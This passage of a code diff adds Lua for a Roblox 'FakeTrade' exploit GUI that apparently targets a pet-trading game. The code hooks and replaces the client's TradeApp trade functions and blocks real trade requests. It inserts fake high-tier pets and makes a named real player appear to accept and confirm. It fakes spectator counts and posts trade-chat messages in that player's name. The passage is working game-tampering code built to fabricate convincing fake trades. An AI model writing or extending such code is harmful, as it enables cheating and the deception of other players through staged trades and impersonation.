+        local ok, err = pcall(function()
+            runBlockSystem() -- this must be your CJL BLOCK function
+        end)
+        if not ok then
+            cjlOpen = false
+            warn("[Envision Block] failed:", err)
+        end
+    end)
+end)
+
+-- Bot Spawner tab content
+local botCard = Instance.new("Frame")
+botCard.Size = UDim2.new(1, -20, 0, 80)
+botCard.Position = UDim2.new(0, 10, 0, 10)
+botCard.BackgroundColor3 = Color3.fromRGB(22, 24, 36)
+botCard.BorderSizePixel = 0
+botCard.Parent = botToolContent
+
+local botCorner = Instance.new("UICorner")
+botCorner.CornerRadius = UDim.new(0, 10)
+botCorner.Parent = botCard
+
+local botTitle = Instance.new("TextLabel")
+botTitle.Size = UDim2.new(1, -16, 0, 20)
+botTitle.Position = UDim2.new(0, 8, 0, 6)
+botTitle.BackgroundTransparency = 1
+botTitle.Font = Enum.Font.GothamBold
+botTitle.TextSize = 12
+botTitle.TextColor3 = Color3.fromRGB(210, 215, 255)
+botTitle.TextXAlignment = Enum.TextXAlignment.Left
+botTitle.Text = "bot spawner"
+botTitle.Parent = botCard
+
+local botSub = Instance.new("TextLabel")
+botSub.Size = UDim2.new(1, -16, 0, 16)
+botSub.Position = UDim2.new(0, 8, 0, 24)
+botSub.BackgroundTransparency = 1
+botSub.Font = Enum.Font.Gotham
+botSub.TextSize = 10
+botSub.TextColor3 = Color3.fromRGB(160, 168, 220)
+botSub.TextXAlignment = Enum.TextXAlignment.Left
+botSub.Text = "animated bots"
+botSub.Parent = botCard
+
+local botRun = Instance.new("TextButton")
+botRun.Size = UDim2.new(0, 120, 0, 24)
+botRun.Position = UDim2.new(0, 8, 1, -30)
+botRun.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
+botRun.BorderSizePixel = 0
+botRun.Font = Enum.Font.GothamBold
+botRun.TextSize = 12
+botRun.TextColor3 = Color3.new(1,1,1)
+botRun.Text = "launch bots ui"
+botRun.Parent = botCard
+
+local botRunCorner = Instance.new("UICorner")
+botRunCorner.CornerRadius = UDim.new(0, 8)
+botRunCorner.Parent = botRun
+
+botRun.MouseButton1Click:Connect(function()
+    pcall(runBotSpawner)
+end)
+
+
+
+------------------
+-- Start button --
+------------------
+local startButton = Instance.new("TextButton")
+startButton.Name = "StartButton"
+startButton.Size = UDim2.new(1, -20, 0, 32)
+startButton.Position = UDim2.new(0, 10, 0, 0)
+startButton.BackgroundColor3 = Color3.fromRGB(82, 182, 134)
+startButton.Font = Enum.Font.GothamBold
+startButton.TextSize = 13
+startButton.TextColor3 = Color3.new(1,1,1)
+startButton.Text = "start visual trade"
+startButton.BorderSizePixel = 0
+startButton.Parent = tradeContent
+
+local startCorner = Instance.new("UICorner")
+startCorner.CornerRadius = UDim.new(0, 10)
+startCorner.Parent = startButton
+
+local startStroke = Instance.new("UIStroke")
+startStroke.Color = Color3.fromRGB(60, 135, 110)
+startStroke.Thickness = 2
+startStroke.Parent = startButton
+
+------------------------
+-- Timing (delays)    --
+------------------------
+
+-- Accept Delay
+local acceptLabel = Instance.new("TextLabel")
+acceptLabel.Size = UDim2.new(1, -20, 0, 16)
+acceptLabel.Position = UDim2.new(0, 10, 0, 36)
+acceptLabel.BackgroundTransparency = 1
+acceptLabel.Font = Enum.Font.Gotham
+acceptLabel.TextSize = 11
+acceptLabel.TextColor3 = Color3.fromRGB(200, 205, 240)
+acceptLabel.TextXAlignment = Enum.TextXAlignment.Left
+acceptLabel.Text = "accept delay (seconds)"
+acceptLabel.Parent = tradeContent
+
+local acceptBox = Instance.new("TextBox")
+acceptBox.Size = UDim2.new(1, -20, 0, 22)
+acceptBox.Position = UDim2.new(0, 10, 0, 52)
+acceptBox.BackgroundColor3 = Color3.fromRGB(28, 30, 45)
+acceptBox.BorderSizePixel = 0
+acceptBox.Font = Enum.Font.Gotham
+acceptBox.TextSize = 11
+acceptBox.TextColor3 = Color3.fromRGB(220, 225, 255)
+acceptBox.ClearTextOnFocus = false
+acceptBox.Text = string.format("%.2f", acceptDelay)
+acceptBox.Parent = tradeContent
+
+local acceptCorner = Instance.new("UICorner")
+acceptCorner.CornerRadius = UDim.new(0, 6)
+acceptCorner.Parent = acceptBox
+
+acceptBox.FocusLost:Connect(function(enterPressed)
+    local v = tonumber(acceptBox.Text)
+    if v and v >= 0 and v <= 10 then
+        acceptDelay = v
+        acceptBox.Text = string.format("%.2f", acceptDelay)
+    else
+        -- reset to last good value
+        acceptBox.Text = string.format("%.2f", acceptDelay)
+    end
+end)
+
+-- Confirm Delay
+local confirmLabel = Instance.new("TextLabel")
+confirmLabel.Size = UDim2.new(1, -20, 0, 16)
+confirmLabel.Position = UDim2.new(0, 10, 0, 80)
+confirmLabel.BackgroundTransparency = 1
+confirmLabel.Font = Enum.Font.Gotham
+confirmLabel.TextSize = 11
+confirmLabel.TextColor3 = Color3.fromRGB(200, 205, 240)
+confirmLabel.TextXAlignment = Enum.TextXAlignment.Left
+confirmLabel.Text = "confirm delay (seconds)"
+confirmLabel.Parent = tradeContent
+
+local confirmBox = Instance.new("TextBox")
+confirmBox.Size = UDim2.new(1, -20, 0, 22)
+confirmBox.Position = UDim2.new(0, 10, 0, 96)
+confirmBox.BackgroundColor3 = Color3.fromRGB(28, 30, 45)
+confirmBox.BorderSizePixel = 0
+confirmBox.Font = Enum.Font.Gotham
+confirmBox.TextSize = 11
+confirmBox.TextColor3 = Color3.fromRGB(220, 225, 255)
+confirmBox.ClearTextOnFocus = false
+confirmBox.Text = string.format("%.2f", confirmDelay)
+confirmBox.Parent = tradeContent
+
+local confirmCorner = Instance.new("UICorner")
+confirmCorner.CornerRadius = UDim.new(0, 6)
+confirmCorner.Parent = confirmBox
+
+confirmBox.FocusLost:Connect(function(enterPressed)
+    local v = tonumber(confirmBox.Text)
+    if v and v >= 0 and v <= 10 then
+        confirmDelay = v
+        confirmBox.Text = string.format("%.2f", confirmDelay)
+    else
+        confirmBox.Text = string.format("%.2f", confirmDelay)
+    end
+end)
+
+-------------------------
+-- Spectator selection --
+-------------------------
+local specLabel = Instance.new("TextLabel")
+specLabel.Size = UDim2.new(1, -20, 0, 16)
+specLabel.Position = UDim2.new(0, 10, 0, 120)  -- a bit lower to make space for delay boxes
+specLabel.BackgroundTransparency = 1
+specLabel.Font = Enum.Font.Gotham
+specLabel.TextSize = 11
+specLabel.TextColor3 = Color3.fromRGB(170, 180, 230)
+specLabel.TextXAlignment = Enum.TextXAlignment.Left
+specLabel.Text = "spectators"
+specLabel.Parent = tradeContent
+
+local specFrame = Instance.new("Frame")
+specFrame.Size = UDim2.new(1, -20, 0, 24)
+specFrame.Position = UDim2.new(0, 10, 0, 144)
+specFrame.BackgroundColor3 = Color3.fromRGB(26, 28, 40)
+specFrame.BorderSizePixel = 0
+specFrame.Parent = tradeContent
+
+local specCorner = Instance.new("UICorner")
+specCorner.CornerRadius = UDim.new(0, 8)
+specCorner.Parent = specFrame
+
+-- left arrow
+local specLeft = Instance.new("TextButton")
+specLeft.Size = UDim2.new(0, 24, 0, 18)
+specLeft.Position = UDim2.new(0, 4, 0, 3)
+specLeft.BackgroundColor3 = Color3.fromRGB(55, 60, 90)
+specLeft.BorderSizePixel = 0
+specLeft.Font = Enum.Font.GothamBold
+specLeft.TextSize = 12
+specLeft.TextColor3 = Color3.new(1,1,1)
+specLeft.Text = "<"
+specLeft.Parent = specFrame
+
+local specLeftCorner = Instance.new("UICorner")
+specLeftCorner.CornerRadius = UDim.new(0, 6)
+specLeftCorner.Parent = specLeft
+
+-- value label
+local specValue = Instance.new("TextLabel")
+specValue.Size = UDim2.new(0, 40, 0, 18)
+specValue.Position = UDim2.new(0.5, -20, 0, 3)
+specValue.BackgroundTransparency = 1
+specValue.Font = Enum.Font.GothamBold
+specValue.TextSize = 12
+specValue.TextColor3 = Color3.new(1,1,1)
+specValue.Text = tostring(desiredMaxSpectators)
+specValue.Parent = specFrame
+
+-- right arrow
+local specRight = Instance.new("TextButton")
+specRight.Size = UDim2.new(0, 24, 0, 18)
+specRight.Position = UDim2.new(1, -28, 0, 3)
+specRight.BackgroundColor3 = Color3.fromRGB(55, 60, 90)
+specRight.BorderSizePixel = 0
+specRight.Font = Enum.Font.GothamBold
+specRight.TextSize = 12
+specRight.TextColor3 = Color3.new(1,1,1)
+specRight.Text = ">"
+specRight.Parent = specFrame
+
+local specRightCorner = Instance.new("UICorner")
+specRightCorner.CornerRadius = UDim.new(0, 6)
+specRightCorner.Parent = specRight
+
+local function updateSpectatorDisplay()
+    specValue.Text = tostring(desiredMaxSpectators)
+    startButton.Text = string.format("start visual trade  •  %d", desiredMaxSpectators)
+end
+
+local function changeSpectators(delta)
+    local new = math.clamp(desiredMaxSpectators + delta, MIN_SPECTATORS, MAX_SPECTATORS)
+    if new == desiredMaxSpectators then return end
+    desiredMaxSpectators = new
+    updateSpectatorDisplay()
+
+    -- if we're in a non-random trade, push the new count into the visual trade live
+    if fakeActive and not randomSpectatorsEnabled then
+        local s = getLocalState()
+        if s and s.trade_id == fakeTradeId then
+            allowOverwrite = true
+            s.subscriber_count = desiredMaxSpectators
+            TradeApp:_overwrite_local_trade_state(s)
+            allowOverwrite = false
+            TradeApp:refresh_all()
+        end
+    end
+end
+
+specLeft.MouseButton1Click:Connect(function()
+    changeSpectators(-1)
+end)
+
+specRight.MouseButton1Click:Connect(function()
+    changeSpectators(1)
+end)
+
+updateSpectatorDisplay()
+
+------------------------
+-- Add / remove buttons
+------------------------
+------------------------
+-- Add / remove buttons + Pet Type Selection
+------------------------
+-- Pet Type Selection Container
+local petTypeContainer = Instance.new("Frame")
+petTypeContainer.Size = UDim2.new(1, -20, 0, 30)
+petTypeContainer.Position = UDim2.new(0, 10, 0, 166)
+petTypeContainer.BackgroundTransparency = 1
+petTypeContainer.Parent = tradeContent
+
+local petTypeTitle = Instance.new("TextLabel")
+petTypeTitle.Size = UDim2.new(1, 0, 0, 14)
+petTypeTitle.Position = UDim2.new(0, 0, 0, 0)
+petTypeTitle.BackgroundTransparency = 1
+petTypeTitle.Font = Enum.Font.Gotham
+petTypeTitle.TextSize = 10
+petTypeTitle.TextColor3 = Color3.fromRGB(180, 185, 230)
+petTypeTitle.TextXAlignment = Enum.TextXAlignment.Left
+petTypeTitle.Text = "pet type (pick at least one):"
+petTypeTitle.Parent = petTypeContainer
+
+-- Pet Type Buttons
+local petTypeButtons = {}
+local selectedPetTypes = {
+    M = false, -- Mega
+    N = false, -- Neon
+    F = false, -- Fly
+    R = false  -- Ride
+}
+
+local function updatePetTypeButtons()
+    for letter, btn in pairs(petTypeButtons) do
+        if selectedPetTypes[letter] then
+            if letter == "M" or letter == "N" then
+                btn.BackgroundColor3 = Color3.fromRGB(170, 0, 255) -- Purple for Mega/Neon
+            else
+                btn.BackgroundColor3 = Color3.fromRGB(82, 182, 134) -- Green for Fly/Ride
+            end
+            btn.TextColor3 = Color3.new(1, 1, 1)
+        else
+            btn.BackgroundColor3 = Color3.fromRGB(40, 45, 70)
+            btn.TextColor3 = Color3.fromRGB(180, 185, 230)
+        end
+    end
+end
+
+local petTypes = {"M", "N", "F", "R"}
+local petTypeNames = {"MEGA", "NEON", "FLY", "RIDE"}
+
+for i, letter in ipairs(petTypes) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.24, -2, 0, 24)
+    btn.Position = UDim2.new((i-1)*0.24, 0, 0, 14)
+    btn.Text = petTypeNames[i]
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 10
+    btn.BorderSizePixel = 0
+    btn.Parent = petTypeContainer
+    
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 6)
+    c.Parent = btn
+    
+    petTypeButtons[letter] = btn
+    
+    btn.MouseButton1Click:Connect(function()
+        -- M and N are exclusive (can't have both)
+        if letter == "M" then
+            selectedPetTypes["M"] = not selectedPetTypes["M"]
+            if selectedPetTypes["M"] then
+                selectedPetTypes["N"] = false
+            end
+        elseif letter == "N" then
+            selectedPetTypes["N"] = not selectedPetTypes["N"]
+            if selectedPetTypes["N"] then
+                selectedPetTypes["M"] = false
+            end
+        else
+            -- F and R are toggles
+            selectedPetTypes[letter] = not selectedPetTypes[letter]
+        end
+        
+        updatePetTypeButtons()
+    end)
+end
+
+-- Initialize buttons
+updatePetTypeButtons()
+
+local addButton = Instance.new("TextButton")
+addButton.Size = UDim2.new(1, -20, 0, 24)
+addButton.Position = UDim2.new(0, 10, 0, 200)
+addButton.BackgroundColor3 = Color3.fromRGB(235, 149, 84)
+addButton.BorderSizePixel = 0
+addButton.Font = Enum.Font.GothamBold
+addButton.TextSize = 12
+addButton.TextColor3 = Color3.new(1,1,1)
+addButton.Text = "add high tier pet"
+addButton.Parent = tradeContent
+
+local addCorner = Instance.new("UICorner")
+addCorner.CornerRadius = UDim.new(0, 8)
+addCorner.Parent = addButton
+
+local removeButton = Instance.new("TextButton")
+removeButton.Size = UDim2.new(1, -20, 0, 24)
+removeButton.Position = UDim2.new(0, 10, 0, 228)
+removeButton.BackgroundColor3 = Color3.fromRGB(220, 90, 90)
+removeButton.BorderSizePixel = 0
+removeButton.Font = Enum.Font.GothamBold
+removeButton.TextSize = 12
+removeButton.TextColor3 = Color3.new(1,1,1)
+removeButton.Text = "remove last pet"
+removeButton.Parent = tradeContent
+
+local removeCorner = Instance.new("UICorner")
+removeCorner.CornerRadius = UDim.new(0, 8)
+removeCorner.Parent = removeButton
+
+-- make partner accept button
+local forceAcceptButton = Instance.new("TextButton")
+forceAcceptButton.Size = UDim2.new(1, -20, 0, 24)
+forceAcceptButton.Position = UDim2.new(0, 10, 0, 256)
+forceAcceptButton.BackgroundColor3 = Color3.fromRGB(120, 140, 230)
+forceAcceptButton.BorderSizePixel = 0
+forceAcceptButton.Font = Enum.Font.GothamBold
+forceAcceptButton.TextSize = 12
+forceAcceptButton.TextColor3 = Color3.new(1, 1, 1)
+forceAcceptButton.Text = "make partner accept"
+forceAcceptButton.Parent = tradeContent
+
+local forceAcceptCorner = Instance.new("UICorner")
+forceAcceptCorner.CornerRadius = UDim.new(0, 8)
+forceAcceptCorner.Parent = forceAcceptButton
+
+-----------------------
+-- Player list + info --
+-----------------------
+local playerSection = Instance.new("Frame")
+playerSection.Size = UDim2.new(1, -20, 0, 150)
+playerSection.Position = UDim2.new(0, 10, 0, 288) -- Adjusted position
+playerSection.BackgroundColor3 = Color3.fromRGB(22, 24, 35)
+playerSection.BorderSizePixel = 0
+playerSection.Parent = tradeContent
+
+local playerCorner = Instance.new("UICorner")
+playerCorner.CornerRadius = UDim.new(0, 10)
+playerCorner.Parent = playerSection
+
+local playerTitle = Instance.new("TextLabel")
+playerTitle.Size = UDim2.new(1, -40, 0, 18)
+playerTitle.Position = UDim2.new(0, 10, 0, 6)
+playerTitle.BackgroundTransparency = 1
+playerTitle.Font = Enum.Font.GothamBold
+playerTitle.TextSize = 11
+playerTitle.TextColor3 = Color3.fromRGB(200, 205, 245)
+playerTitle.TextXAlignment = Enum.TextXAlignment.Left
+playerTitle.Text = "trade partner"
+playerTitle.Parent = playerSection
+
+local refreshButton = Instance.new("TextButton")
+refreshButton.Size = UDim2.new(0, 22, 0, 18)
+refreshButton.Position = UDim2.new(1, -26, 0, 6)
+refreshButton.BackgroundTransparency = 1
+refreshButton.Font = Enum.Font.GothamBold
+refreshButton.TextSize = 13
+refreshButton.TextColor3 = Color3.fromRGB(150, 160, 230)
+refreshButton.Text = "⟳"
+refreshButton.Parent = playerSection
+
+-- manual username box
+local nameBox = Instance.new("TextBox")
+nameBox.Size = UDim2.new(1, -14, 0, 20)
+nameBox.Position = UDim2.new(0, 7, 0, 26)
+nameBox.BackgroundColor3 = Color3.fromRGB(28, 30, 45)
+nameBox.BorderSizePixel = 0
+nameBox.Font = Enum.Font.Gotham
+nameBox.TextSize = 11
+nameBox.TextColor3 = Color3.fromRGB(220, 225, 255)
+nameBox.PlaceholderText = "type username + press Enter"
+nameBox.PlaceholderColor3 = Color3.fromRGB(120, 125, 175)
+nameBox.ClearTextOnFocus = false
+nameBox.Text = ""
+nameBox.Parent = playerSection
+
+local nameBoxCorner = Instance.new("UICorner")
+nameBoxCorner.CornerRadius = UDim.new(0, 6)
+nameBoxCorner.Parent = nameBox
+
+local playerList = Instance.new("ScrollingFrame")
+playerList.Size = UDim2.new(1, -14, 1, -54)
+playerList.Position = UDim2.new(0, 7, 0, 48)
+playerList.BackgroundColor3 = Color3.fromRGB(18, 20, 32)
+playerList.BorderSizePixel = 0
+playerList.ScrollBarThickness = 4
+playerList.CanvasSize = UDim2.new()
+playerList.Parent = playerSection
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.Padding = UDim.new(0, 3)
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.Parent = playerList
+
+local selectedNameLabel = Instance.new("TextLabel")
+selectedNameLabel.Size = UDim2.new(1, -20, 0, 16)
+selectedNameLabel.Position = UDim2.new(0, 10, 1, -26)
+selectedNameLabel.BackgroundTransparency = 1
+selectedNameLabel.Font = Enum.Font.Gotham
+selectedNameLabel.TextSize = 11
+selectedNameLabel.TextColor3 = Color3.fromRGB(210, 215, 255)
+selectedNameLabel.TextXAlignment = Enum.TextXAlignment.Left
+selectedNameLabel.Text = currentTargetDisplayName
+selectedNameLabel.Parent = tradeContent
+
+local selectedIdLabel = Instance.new("TextLabel")
+selectedIdLabel.Size = UDim2.new(1, -20, 0, 14)
+selectedIdLabel.Position = UDim2.new(0, 10, 1, -12)
+selectedIdLabel.BackgroundTransparency = 1
+selectedIdLabel.Font = Enum.Font.Gotham
+selectedIdLabel.TextSize = 10
+selectedIdLabel.TextColor3 = Color3.fromRGB(150, 155, 205)
+selectedIdLabel.TextXAlignment = Enum.TextXAlignment.Left
+selectedIdLabel.Text = "ID: visual_only"
+selectedIdLabel.Visible = false
+selectedIdLabel.Parent = tradeContent
+
+-------------------------------------------------
+-- Player list helper + auto-refresh           --
+-------------------------------------------------
+local function setCurrentTarget(displayName, id)
+    currentTargetDisplayName = displayName
+    currentTargetName        = displayName
+    currentTargetId          = id or 0
+
+    selectedNameLabel.Text = currentTargetDisplayName
+    if currentTargetId ~= 0 then
+        selectedIdLabel.Text = "ID: "..tostring(currentTargetId)
+    else
+        selectedIdLabel.Text = "ID: visual_only"
+    end
+end
+
+    setIdleStatus() -- keeps header in sync with whoever is selected
+
+local function getUserIdFromName(name)
+    if cachedUserIds[name] ~= nil then
+        return cachedUserIds[name]
+    end
+    local id = 0
+    local ok, result = pcall(function()
+        return Players:GetUserIdFromNameAsync(name)
+    end)
+    if ok then
+        id = result
+    end
+    cachedUserIds[name] = id
+    return id
+end
+
+local function createPlayerButton(displayName, userId, isStatic, layoutOrder)
+    local b = Instance.new("TextButton")
+    b.Name = displayName
+    b.Size = UDim2.new(1, 0, 0, 22)
+    b.BorderSizePixel = 0
+    b.Font = Enum.Font.Gotham
+    b.TextSize = 11
+    b.TextXAlignment = Enum.TextXAlignment.Left
+    b.Text = "  " .. displayName
+    b.LayoutOrder = layoutOrder or 0
+
+    if isStatic then
+        b.BackgroundColor3 = Color3.fromRGB(185, 205, 255)
+        b.TextColor3 = Color3.fromRGB(25, 35, 60)
+    else
+        b.BackgroundColor3 = Color3.fromRGB(34, 36, 52)
+        b.TextColor3 = Color3.fromRGB(225, 230, 255)
+    end
+
+    b.Parent = playerList
+
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 6)
+    c.Parent = b
+
+    b.MouseButton1Click:Connect(function()
+        setCurrentTarget(displayName, userId)
+        print("[FakeTrade] selected partner:", displayName, "(ID:", userId, ")")
+    end)
+end
+
+local function rebuildPlayerList()
+    for _, child in ipairs(playerList:GetChildren()) do
+        if child:IsA("TextButton") then
+            child:Destroy()
+        end
+    end
+
+    local usedReal = {}
+    local order = 0
+
+    -- static names first
+    for _, name in ipairs(STATIC_PLAYER_NAMES) do
+        local plr = Players:FindFirstChild(name)
+        if plr and plr ~= LocalPlayer then
+            usedReal[plr] = true
+            createPlayerButton(plr.Name, plr.UserId, false, order)
+        else
+            local uid = getUserIdFromName(name)
+            createPlayerButton(name, uid, true, order)
+        end
+        order += 1
+    end
+
+    -- all other real players
+    local realOrder = 100
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and not usedReal[plr] and not table.find(STATIC_PLAYER_NAMES, plr.Name) then
+            createPlayerButton(plr.Name, plr.UserId, false, realOrder)
+            realOrder += 1
+        end
+    end
+
+    playerList.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y)
+end
+
+refreshButton.MouseButton1Click:Connect(rebuildPlayerList)
+Players.PlayerAdded:Connect(rebuildPlayerList)
+Players.PlayerRemoving:Connect(rebuildPlayerList)
+rebuildPlayerList()
+
+-- manual username entry (preserves your casing for display)
+nameBox.FocusLost:Connect(function(enterPressed)
+    if not enterPressed then return end
+    local text = nameBox.Text or ""
+    text = text:gsub("^%s+", ""):gsub("%s+$", "")
+    if text == "" then return end
+
+    local typedDisplay = text
+    local lookupName   = text
+    local chosenId     = 0
+
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Name:lower() == text:lower() then
+            lookupName = plr.Name
+            chosenId   = plr.UserId
+            break
+        end
+    end
+
+    if chosenId == 0 then
+        chosenId = getUserIdFromName(lookupName)
+    end
+
+    setCurrentTarget(typedDisplay, chosenId)
+    print("[FakeTrade] manual partner set to:", typedDisplay, "(ID:", chosenId, ")")
+end)
+
+-------------------------------------------------
+-- Random spectator loop (changes over time)   --
+-------------------------------------------------
+local function startSpectatorLoop()
+    if spectatorLoopRunning then return end
+    spectatorLoopRunning = true
+
+    task.spawn(function()
+        while spectatorLoopRunning and fakeActive do
+            task.wait(math.random(7, 13))
+            if not fakeActive then break end
+            local newCount = math.random(1, math.max(1, desiredMaxSpectators))
+            local s = getLocalState()
+            if s and s.trade_id == fakeTradeId then
+                allowOverwrite = true
+                s.subscriber_count = newCount
+                TradeApp:_overwrite_local_trade_state(s)
+                allowOverwrite = false
+                TradeApp:refresh_all()
+            end
+        end
+        spectatorLoopRunning = false
+    end)
+end
+
+    setInTradeStatus()
+
+local function stopSpectatorLoop()
+    spectatorLoopRunning = false
+end
+
+-- apply current spectator mode (random vs fixed) to an active trade
+local function applySpectatorMode()
+    if not fakeActive then return end
+
+    if randomSpectatorsEnabled then
+        startSpectatorLoop()
+    else
+        stopSpectatorLoop()
+        local s = getLocalState()
+        if s and s.trade_id == fakeTradeId then
+            allowOverwrite = true
+            s.subscriber_count = desiredMaxSpectators
+            TradeApp:_overwrite_local_trade_state(s)
+            allowOverwrite = false
+            TradeApp:refresh_all()
+        end
+    end
+end
+
+-----------------------------
+-- Timeout safety (60 sec) --
+-----------------------------
+local function restoreHooks()
+    TradeApp._on_accept_pressed           = originalAccept
+    TradeApp._on_confirm_pressed          = originalConfirm
+    TradeApp._overwrite_local_trade_state = originalOverwrite
+    TradeApp._remove_item_from_my_offer   = originalRemove
+
+    -- fully unlock the game when fake trade ends
+    blockRealTrades = false
+    stopBlockingRealRequests()
+    stopSpectatorLoop()
+    stopNameFix()
+end
+
+
+
+---------------------------------------------
+-- Shared helper: remove last from a side  --
+---------------------------------------------
+local function removeLastFromOffer(sideKey)
+    local s = getLocalState()
+    if not s or s.trade_id ~= fakeTradeId then return nil, nil end
+    local offer = s[sideKey]
+    if not offer or not offer.items or #offer.items == 0 then return nil, nil end
+
+    local removed = table.remove(offer.items)
+
+    allowOverwrite = true
+    TradeApp:_overwrite_local_trade_state(s)
+    allowOverwrite = false
+    TradeApp:_lock_trade_for_appropriate_time()
+    tradeUnlockAt = os.clock() + LOCK_DURATION
+    TradeApp:refresh_all()
+
+    return removed, sideKey
+end
+
+---------------------------------------------
+-- Force partner accept helper             --
+---------------------------------------------
+local function forcePartnerAccept()
+print("[DEBUG] forcePartnerAccept called")
+    print("[DEBUG] Current time:", os.clock())
+    print("[DEBUG] tradeUnlockAt:", tradeUnlockAt)
+    print("[DEBUG] Lock expired?:", os.clock() >= tradeUnlockAt)
+    -- Check if there's anything in the trade
+    local s = getLocalState()
+    if not s or s.trade_id ~= fakeTradeId then
+        warn("[FakeTrade] no active visual trade – can't force accept")
+        return
+    end
+
+print("[DEBUG] Current stage:", s.current_stage)
+    print("[DEBUG] isConfirmationStage:", s.current_stage == "confirmation")
+    
+    -- Check if either side has items
+    local senderHasItems = s.sender_offer.items and #s.sender_offer.items > 0
+    local recipientHasItems = s.recipient_offer.items and #s.recipient_offer.items > 0
+    if not senderHasItems and not recipientHasItems then
+        warn("[FakeTrade] trade is empty – add items first")
+        return
+    end
+
+    -- Check current stage
+    local isConfirmationStage = (s.current_stage == "confirmation")
+    
+    if isConfirmationStage then
+print("[DEBUG] In confirmation stage check")
+        print("[DEBUG] partner already confirmed?:", s.recipient_offer.confirmed)
+        print("[DEBUG] Time left on lock:", math.max(0, tradeUnlockAt - os.clock()))
+        -- On confirmation stage: can only confirm, cannot unconfirm
+        if s.recipient_offer.confirmed then
+            warn("[FakeTrade] partner already confirmed – cannot unconfirm")
+            return
+        end
+        
+        -- ⚠️ PARTNER CAN ONLY CONFIRM AFTER LOCK TIMER EXPIRES (SAME AS ACCEPT STAGE)
+        if os.clock() < tradeUnlockAt then
+            warn("[FakeTrade] confirmation stage is locked – wait " .. math.ceil(tradeUnlockAt - os.clock()) .. "s")
+            return
+        end
+
+print("[DEBUG] Lock passed, proceeding with confirm")
+        
+        -- Partner confirms (after lock timer)
+        s.recipient_offer.confirmed = true
+        s.recipient_offer.negotiated = true
+        
+        -- ⚠️ NO NEW LOCK TIMER - just confirming
+        
+    else
+        -- On negotiation stage: toggle accept/unaccept
+        local isUnaccepting = s.recipient_offer.negotiated
+        
+        -- ⚠️ PARTNER CAN ONLY ACCEPT AFTER LOCK TIMER EXPIRES (unless unaccepting)
+        if not isUnaccepting and os.clock() < tradeUnlockAt then
+            warn("[FakeTrade] trade is currently locked – wait " .. math.ceil(tradeUnlockAt - os.clock()) .. "s")
+            return
+        end
+        
+        -- Toggle accept state
+        s.recipient_offer.negotiated = not s.recipient_offer.negotiated
+        s.recipient_offer.confirmed = false
+        
+        -- If partner is accepting and we've also accepted, move to confirmation
+        if s.recipient_offer.negotiated and s.sender_offer.negotiated then
+            s.current_stage = "confirmation"
+            s.offer_version = (s.offer_version or 1) + 1
+            
+            -- ⚠️ LOCK TIMER APPLIED WHEN MOVING TO CONFIRMATION STAGE
+            -- This sets tradeUnlockAt = os.clock() + LOCK_DURATION
+            TradeApp:_lock_trade_for_appropriate_time()
+            
+            -- ⚠️ IMPORTANT: Update our local lock timer to match
+            tradeUnlockAt = os.clock() + LOCK_DURATION
+            
+            print("[FakeTrade] moved to confirmation stage – lock timer applied (" .. LOCK_DURATION .. "s)")
+        elseif not s.recipient_offer.negotiated and s.current_stage == "confirmation" then
+            -- If unaccepting while in confirmation stage, go back to negotiation
+            s.current_stage = "negotiation"
+        end
+    end
+
+    s.recipient_offer.player_name = currentTargetDisplayName
+    
+    allowOverwrite = true
+    TradeApp:_overwrite_local_trade_state(s)
+    allowOverwrite = false
+    TradeApp:refresh_all()
+
+    -- Show appropriate chat message
+    local actionText
+    if isConfirmationStage then
+        actionText = "confirmed"
+    else
+        actionText = s.recipient_offer.negotiated and "accepted" or "unaccepted"
+    end
+    
+    TradeApp:_render_message_in_trade_chat(
+        nil,
+        string.format("%s %s the trade", currentTargetDisplayName, actionText),
+        false,
+        true
+    )
+
+    print(string.format("[FakeTrade] partner %s (stage: %s, lock expires in: %.1fs)", 
+        actionText, s.current_stage, math.max(0, tradeUnlockAt - os.clock())))
+end
+---------------------------------------------
+-- Wrap TradeApp to control fake trades    --
+---------------------------------------------
+local function enableFakeTradeHooks()
+    fakeActive = true
+    startNameFix()
+
+    TradeApp._overwrite_local_trade_state = function(self, trade, ...)
+        if trade == nil and fakeActive and not allowOverwrite then
+            print("[FakeTrade] trade state cleared externally – resetting hooks")
+            fakeActive = false
+            fakeTradeId = nil
+            stopSpectatorLoop()
+            restoreHooks()
+            return originalOverwrite(self, trade, ...)
+        end
+
+        if not fakeActive or allowOverwrite then
+            local result = originalOverwrite(self, trade, ...)
+            return result
+        end
+
+        if trade == nil then
+            fakeActive = false
+            fakeTradeId = nil
+            stopSpectatorLoop()
+            restoreHooks()
+            local result = originalOverwrite(self, trade, ...)
+            return result
+        end
+
+        if trade and trade.trade_id and trade.trade_id ~= fakeTradeId then
+            print("[FakeTrade] blocked real trade overwrite while visual trade active")
+            return
+        end
+
+        local result = originalOverwrite(self, trade, ...)
+        return result
+    end
+
+    TradeApp._remove_item_from_my_offer = function(self, item)
+        local s = getLocalState()
+        if not fakeActive or not s or s.trade_id ~= fakeTradeId or not item or not item.unique then
+            return originalRemove(self, item)
+        end
+
+        local removedItem, removedSide
+
+        local function trySide(key)
+            local offer = s[key]
+            if not offer or not offer.items then return false end
+            for i, v in ipairs(offer.items) do
+                if v.unique == item.unique then
+                    removedItem = v
+                    removedSide = key
+                    table.remove(offer.items, i)
+                    return true
+                end
+            end
+            return false
+        end
+
+        if not trySide("recipient_offer") and not trySide("sender_offer") then
+            return originalRemove(self, item)
+        end
+
+allowOverwrite = true
+TradeApp:_overwrite_local_trade_state(s)
+allowOverwrite = false
+
+-- game’s lock + our local 5s lock
+TradeApp:_lock_trade_for_appropriate_time()
+tradeUnlockAt = os.clock() + LOCK_DURATION
+
+TradeApp:refresh_all()
+
+        if removedItem then
+            local tag = removedItem.properties and tagForProps(removedItem.properties) or "FR"
+            local nice = removedItem.kind and formatPetName(removedItem.kind) or "Pet"
+            local who  = (removedSide == "sender_offer") and LocalPlayer.Name or currentTargetDisplayName
+
+            self:_render_message_in_trade_chat(
+                nil,
+                string.format("%s removed %s %s", who, tag, nice),
+                false,
+                true
